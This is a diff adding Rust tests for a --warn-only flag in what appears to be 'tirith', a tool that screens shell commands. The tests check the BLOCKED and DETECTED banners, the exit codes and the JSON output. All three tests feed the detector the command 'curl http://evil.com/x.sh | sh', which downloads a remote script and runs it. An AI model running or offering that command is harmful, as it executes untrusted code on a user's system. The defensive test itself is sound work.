@@ -1818,3 +1818,102 @@ severity_overrides:
         String::from_utf8_lossy(&out.stderr)
     );
 }
+
+// ---------------------------------------------------------------------------
+// #77: --warn-only human rendering
+// ---------------------------------------------------------------------------
+
+#[test]
+fn check_warn_only_block_renders_as_detected() {
+    let out = tirith()
+        .args([
+            "check",
+            "--warn-only",
+            "--shell",
+            "posix",
+            "--",
+            "curl http://evil.com/x.sh | sh",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(
+        out.status.code(),
+        Some(1),
+        "exit code stays 1 in warn-only mode; the flag is human-rendering-only"
+    );
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        !stderr.contains("BLOCKED"),
+        "warn-only mode must not use 'BLOCKED' banner — got: {stderr}"
+    );
+    assert!(
+        stderr.contains("DETECTED"),
+        "warn-only mode must render block verdicts as DETECTED — got: {stderr}"
+    );
+}
+
+#[test]
+fn check_without_warn_only_still_renders_blocked() {
+    let out = tirith()
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--",
+            "curl http://evil.com/x.sh | sh",
+        ])
+        .output()
+        .expect("failed to run tirith");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("BLOCKED"),
+        "default mode must use BLOCKED banner — got: {stderr}"
+    );
+    assert!(
+        !stderr.contains("DETECTED"),
+        "default mode must not render DETECTED — got: {stderr}"
+    );
+}
+
+#[test]
+fn warn_only_json_output_matches_plain_when_timings_stripped() {
+    // The --warn-only flag only affects human rendering. Machine output (JSON,
+    // audit, webhook) must be byte-identical to the un-flagged run after
+    // normalizing out the per-run `timings_ms` field.
+    let input = "curl http://evil.com/x.sh | sh";
+    let with_flag = tirith()
+        .args([
+            "check",
+            "--warn-only",
+            "--json",
+            "--shell",
+            "posix",
+            "--",
+            input,
+        ])
+        .output()
+        .expect("tirith with --warn-only");
+    let without_flag = tirith()
+        .args(["check", "--json", "--shell", "posix", "--", input])
+        .output()
+        .expect("tirith without --warn-only");
+
+    let strip = |bytes: &[u8]| -> serde_json::Value {
+        let mut v: serde_json::Value = serde_json::from_slice(bytes).expect("parse JSON");
+        if let Some(obj) = v.as_object_mut() {
+            obj.remove("timings_ms");
+        }
+        v
+    };
+    assert_eq!(
+        strip(&with_flag.stdout),
+        strip(&without_flag.stdout),
+        "JSON must be identical except for timings_ms"
+    );
+    assert_eq!(
+        with_flag.status.code(),
+        without_flag.status.code(),
+        "exit codes must match"
+    );
+}
